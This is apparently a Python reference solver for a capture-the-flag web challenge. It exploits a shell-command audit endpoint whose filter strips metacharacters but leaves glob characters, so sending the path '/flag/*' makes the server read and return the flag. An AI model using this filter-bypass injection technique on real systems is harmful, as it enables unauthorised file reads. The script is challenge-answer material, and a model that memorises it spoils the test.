#!/usr/bin/env python3
"""Reference solve for inj8 (StockEye).

The audit runs:
    ls -la {path} && cat {path}
after stripping ; | & $ newline ` > < from {path}. The glob survives, and
the SHELL expands it:

    path = "/flag/*"   ->   ls -la /flag/* && cat /flag/*
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8047")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PAYLOAD = "/flag/*"


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(BASE + "/audit", data={"path": PAYLOAD}, timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
